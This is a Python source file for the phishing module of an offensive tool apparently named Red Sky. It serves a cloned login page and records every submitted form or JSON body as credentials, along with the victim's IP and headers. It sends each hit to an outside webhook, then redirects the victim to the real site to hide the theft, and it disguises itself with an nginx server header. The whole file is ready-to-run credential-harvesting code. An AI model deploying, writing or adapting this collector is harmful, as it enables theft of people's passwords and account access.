# language: Python, file: Program/phishing/collector.py, target: Red Sky phishing — credential capture
# HTTP server that logs every POST body to disk + webhook, then 302s the
# victim to the real target so nothing looks wrong. Runs on a chosen port.

import json
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Dict
from urllib.parse import parse_qs, urlparse

import requests

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


PH_DIR = OUTPUT_DIR / "phishing"
HITS_FILE = PH_DIR / "hits.log"
HITS_JSON = PH_DIR / "hits.json"


class Hit:
    def __init__(self, ip, ua, path, method, body, headers):
        self.ts = time.strftime("%Y-%m-%d %H:%M:%S")
        self.ip = ip
        self.ua = ua
        self.path = path
        self.method = method
        self.body = body
        self.headers = headers

    def as_dict(self):
        return {
            "ts": self.ts, "ip": self.ip, "ua": self.ua,
            "path": self.path, "method": self.method,
            "body": self.body, "headers": self.headers,
        }

    def creds(self) -> Dict[str, str]:
        """Best-effort parse of the POST body into a key/value dict."""
        out = {}
        if not self.body:
            return out
        # form-encoded
        if "=" in self.body and "&" in self.body or "=" in self.body:
            try:
                for k, v in parse_qs(self.body, keep_blank_values=True).items():
                    out[k] = v[0] if v else ""
                if out:
                    return out
            except Exception:
                pass
        # JSON
        try:
            j = json.loads(self.body)
            if isinstance(j, dict):
                for k, v in j.items():
                    if isinstance(v, (str, int, float, bool)):
                        out[k] = str(v)
        except Exception:
            pass
        return out


_lock = threading.Lock()


def _log_hit(hit: Hit, webhook: str = "") -> None:
    PH_DIR.mkdir(parents=True, exist_ok=True)
    d = hit.as_dict()
    creds = hit.creds()

    # text log
    line = hit.ts + " | " + hit.ip + " | " + hit.method + " " + hit.path
    if creds:
        for k, v in creds.items():
            line += " | " + k + "=" + v
    with _lock:
        with HITS_FILE.open("a", encoding="utf-8") as f:
            f.write(line + "\n")

    # json log
    with _lock:
        existing = []
        if HITS_JSON.exists():
            try:
                existing = json.loads(HITS_JSON.read_text())
                if not isinstance(existing, list):
                    existing = []
            except Exception:
                existing = []
        existing.append(d)
        HITS_JSON.write_text(json.dumps(existing, indent=2))

    # stdout
    print(SCARLET + "[hit]" + RESET + " " + BONE + hit.ip + RESET + " " + hit.method + " " + hit.path)
    if creds:
        for k, v in creds.items():
            print("   " + ARTERY + k + RESET + " = " + BONE + v + RESET)

    # webhook
    if webhook:
        try:
            payload = {
                "content": "**Red Sky hit**\n```\n" + line + "\n```",
            }
            requests.post(webhook, json=payload, timeout=6)
        except Exception:
            pass


def make_handler(redirect_to: str, webhook: str, capture_dir: str):
    class Handler(BaseHTTPRequestHandler):
        server_version = "nginx"

        def log_message(self, fmt, *args):
            pass  # silence default

        def _body(self):
            length = int(self.headers.get("Content-Length", 0) or 0)
            if length <= 0:
                return ""
            try:
                return self.rfile.read(length).decode("utf-8", errors="replace")
            except Exception:
                return ""

        def _headers_snapshot(self):
            keep = ("User-Agent", "Accept-Language", "Referer", "X-Forwarded-For", "Content-Type")
            return {k: v for k, v in self.headers.items() if k in keep}

        def do_POST(self):
            hit = Hit(
                ip=self.client_address[0],
                ua=self.headers.get("User-Agent", ""),
                path=self.path,
                method="POST",
                body=self._body(),
                headers=self._headers_snapshot(),
            )
            _log_hit(hit, webhook)
            self._redirect()

        def do_GET(self):
            # log GETs too — some auth flows leak tokens in the query string
            q = urlparse(self.path).query
            hit = Hit(
                ip=self.client_address[0],
                ua=self.headers.get("User-Agent", ""),
                path=self.path + ("?" + q if q else ""),
                method="GET",
                body="",
                headers=self._headers_snapshot(),
            )
            _log_hit(hit, webhook)
            # serve the cloned page if the request path is "/", else redirect
            if self.path in ("/", "/index.html"):
                self._serve_index(capture_dir)
            elif redirect_to and self.path.startswith("/collect"):
                self._redirect()
            else:
                self._redirect()

        def _serve_index(self, base: str):
            idx = Path(base) / "index.html"
            if idx.exists():
                data = idx.read_bytes()
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                try:
                    self.wfile.write(data)
                except Exception:
                    pass
            else:
                self._redirect()

        def _redirect(self):
            self.send_response(302)
            self.send_header("Location", redirect_to or "https://www.google.com")
            self.send_header("Cache-Control", "no-store")
            self.send_header("Content-Length", "0")
            self.end_headers()

    return Handler


def cmd_serve(port: int, redirect_to: str, webhook: str, serve_dir: str) -> int:
    PH_DIR.mkdir(parents=True, exist_ok=True)

    print_info("phishing collector")
    print_kv("port", port)
    print_kv("redirect", redirect_to)
    print_kv("serve_dir", serve_dir if serve_dir else "(none — GET / will redirect)")
    print_kv("webhook", webhook if webhook else "(none)")
    print_kv("hits", HITS_FILE)
    print()

    handler = make_handler(redirect_to, webhook, serve_dir)
    srv = ThreadingHTTPServer(("0.0.0.0", port), handler)
    print_ok("listening on 0.0.0.0:" + str(port))
    print()
    print_warn("CTRL+C to stop")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print()
        print_info("shutting down")
    finally:
        srv.server_close()
    return 0


def cmd_hits() -> int:
    if not HITS_JSON.exists():
        print_info("no hits recorded yet")
        return 0
    try:
        hits = json.loads(HITS_JSON.read_text())
    except Exception:
        print_err("could not read " + str(HITS_JSON))
        return 1
    print_info(str(len(hits)) + " hits")
    print()
    for h in hits:
        print(BONE + h["ts"] + RESET + " | " + h["ip"] + " | " + h["method"] + " " + h["path"])
        body = h.get("body", "")
        if body:
            for chunk in [body[i:i+120] for i in range(0, len(body), 120)]:
                print("   " + ASH + chunk + RESET)
        print()
    print_kv("log", HITS_FILE)
    return 0


def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky phishing collector", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="serve")
    p.add_argument("--port", type=int, default=8080)
    p.add_argument("--redirect", default="")
    p.add_argument("--webhook", default="")
    p.add_argument("--serve-dir", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky phishing collector <serve|hits> --port 8080 --redirect https://real.site")
        return 2

    if ns.help:
        print_info("redsky phishing collector serve --port 8080 --redirect https://real.site --serve-dir Output/phishing/sites/mysite")
        print_info("  serves the clone at /, logs every POST, redirects elsewhere after")
        print_info("redsky phishing collector hits")
        print_info("  print the captured hits")
        return 0

    if ns.action == "serve":
        return cmd_serve(ns.port, ns.redirect, ns.webhook, ns.serve_dir)
    if ns.action == "hits":
        return cmd_hits()
    print_err("unknown collector action: " + ns.action)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
